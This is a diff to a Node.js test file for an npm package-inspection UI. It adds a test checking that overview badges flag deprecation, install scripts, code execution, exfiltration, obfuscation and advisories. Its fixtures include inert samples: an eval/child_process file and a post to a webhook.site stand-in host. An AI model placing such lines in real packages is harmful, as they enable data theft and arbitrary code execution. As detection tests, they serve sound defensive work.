@@ -1,5 +1,6 @@
 import assert from 'node:assert/strict'
 import { mock, test } from 'node:test'
+import { nothing } from 'lit'
 import { templateText as rendered } from './_lit.js'
 
 const state = {}
@@ -25,7 +26,7 @@ mock.module('../ui/view/client-managed.js', { exports: {
   fetchNpmDownloadCounts: names => { countsAsked.push(names); return Promise.resolve({ downloads: Object.fromEntries(names.filter(name => name in answers.counts).map(name => [name, answers.counts[name]])) }) },
   fetchNpmPackage() {}, fetchNpmProvenance: (name, version) => Promise.resolve({ provenance: answers.provenance[`${name}@${version}`] ?? null }), fetchNpmSocket: (name, version) => { socketAsked.push(`${name}@${version}`); return Promise.resolve({ socket: answers.socket[`${name}@${version}`] ?? null }) }, fetchNpmTags: () => Promise.resolve({ tags: [] }), fetchNpmVersions: name => { versionsAsked.push(name); return versionsFail.has(name) ? Promise.reject(new Error('package-not-found')) : Promise.resolve(answers.versions[name] ?? { versions: [] }) }, fetchBundleContents() {}, fetchBundleMetadata() {},
 } })
-const { npmAdvisoryStatus, npmCompareBadges, npmCompareFiles, npmDependencyTags, npmFileTags, npmSettledDownloads, npmFilesFilter, npmReadabilityWarning, npmFileExtension, npmProvenanceFact, npmProvenanceNamesBuilder, npmFileExtensions, npmFileTypes, npmSocketFileTags, npmTakenDown } = await import('../ui/view/npm-overview.js')
+const { npmAdvisoryStatus, npmCompareBadges, npmOverviewBadges, npmCompareFiles, npmDependencyTags, npmFileTags, npmSettledDownloads, npmFilesFilter, npmReadabilityWarning, npmFileExtension, npmProvenanceFact, npmProvenanceNamesBuilder, npmFileExtensions, npmFileTypes, npmSocketFileTags, npmTakenDown } = await import('../ui/view/npm-overview.js')
 const { NPM_LARGE_CODE, NPM_LONG_LINE, npmBecameUnreadable, npmFileFlagTags, npmFileReadability, npmFileReadabilityOf, npmLargeCode, npmObfuscation, npmObfuscationFound, npmReadabilityFlags, npmReadabilityLabels, npmTextEncoding } = await import('../ui/view/file-readability.js')
 const { computeBundleDiff } = await import('../ui/view/bundle-compare-diff.js')
 const { bundleFilesAsMap } = await import('../ui/view/bundle-sources.js')
@@ -888,4 +889,34 @@ test('the Overview\'s provenance: what built the version, from which commit, the
   answers.provenance['builderless@1.0.0'] = { ...answers.provenance['built@1.0.0'], builder: null }
   assert.equal(await (async () => { npmProvenanceNamesBuilder(entry('builderless', { provenance: true }).npm); await new Promise(resolve => { setImmediate(resolve) })
     return npmProvenanceNamesBuilder(entry('builderless', { provenance: true }).npm) })(), false, 'nor where it names no builder')
+})
+
+test('the Overview flags what calls for a look at the version on its own, as Compare\'s chips do, but for what only a change tells', async () => {
+  const scores = changed => ({ overall: 1, supplyChain: 1, vulnerability: 1, quality: 1, maintenance: 1, license: 1, ...changed })
+  answers.versions.held = { versions: ['1.0.0'], times: { '1.0.0': '2020-01-01T00:00:00.000Z' } }
+  answers.advisories.held = { versions: ['1.0.0'], advisories: [{ id: 'a', severity: 'high', affected: [0] }] }
+  answers.socket['held@1.0.0'] = { scores: scores({ quality: .3 }), alerts: [] }
+  const manifest = { deprecated: 'Use other instead', installScripts: { postinstall: 'node setup.js' }, dependencies: { gitdep: 'github:a/b' }, publisher: 'someone' }
+  const files = { 'index.js': "module.exports = x => eval(x)\nrequire('child_process')\n", 'lib/send.js': 'post("https://webhook.site/x")\n',
+    'dist/o.js': `${obfuscated(25)}\n`, 'setup.js': 'module.exports = 1\n', 'lib/big.js': `${'x'.repeat(300 * 1024)}\n` }
+  const details = { integrity: 'held@1.0.0', kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) }, npm: { name: 'held', version: '1.0.0' } }
+  const entry = { npm: { name: 'held', version: '1.0.0', manifest } }
+  npmOverviewBadges(entry, details); await new Promise(resolve => { setImmediate(resolve) })
+  const shown = rendered(npmOverviewBadges(entry, details))
+  const chips = [...shown.matchAll(/<li>[^]*?<\/li>/gu)].map(([chip]) => /<span>([^<]+)<\/span>/u.exec(chip)?.[1] ?? /class="?npm-extension[^>]*>\s*([^<\s][^<]*)</u.exec(chip)?.[1]?.trim())
+  assert.deepEqual(chips, ['Deprecated', 'Install script', 'Non-registry', 'Unimported', 'Runs code', 'Exfiltration', 'Obfuscated', 'Advisories', 'Quality'], 'in Compare\'s order')
+  assert.match(shown, /<ul class="npm-extensions npm-overview-badges" aria-label="Version at a glance">/u)
+  assert.match(shown, /npm-compare-install" data-tooltip=postinstall: node setup\.js[^]*<span>Install script<\/span><span class="npm-extension-count">postinstall</u, 'what npm runs installing it alone')
+  assert.match(shown, /npm-overview-runs[^]*?compare-tip-path">index\.js<\/span><span class="compare-tip-said">eval \(line 1\), child_process \(line 2\)<[^]*?<span class="npm-extension-count">eval, child_process</u)
+  assert.match(shown, /npm-overview-exfiltration[^]*?compare-tip-path">lib\/send\.js<[^]*?<span class="npm-extension-count">webhook\.site</u)
+  assert.match(shown, /npm-overview-obfuscated[^]*?compare-tip-path">dist\/o\.js</u)
+  assert.match(shown, /<span class=npm-extension npm-compare-advisories sev-high[^]*?Advisories affecting 1\.0\.0: 1[^]*?<span class="npm-extension-count">1</u, 'the advisories affecting it, the column listing them')
+  assert.match(shown, /npm-socket-score[^]*>Quality<[^]*>30</u, 'its score alone')
+  assert.doesNotMatch(shown, /npm-compare-(?:publisher|provenance|file|hosts|kept-runs)|Large new code|Now unreadable|New host/u, 'nothing only a change tells')
+
+  answers.versions.clean = { versions: ['1.0.0'], times: { '1.0.0': '2020-01-01T00:00:00.000Z' } }
+  const clean = { npm: { name: 'clean', version: '1.0.0', manifest: {} } }
+  const plain = { ...details, integrity: 'clean@1.0.0', json: { version: 3, sources: ['index.js'], sourcesContent: ['module.exports = 1\n'] }, npm: clean.npm }
+  npmOverviewBadges(clean, plain); await new Promise(resolve => { setImmediate(resolve) })
+  assert.equal(npmOverviewBadges(clean, plain), nothing, 'none for a version that calls for no look')
 })
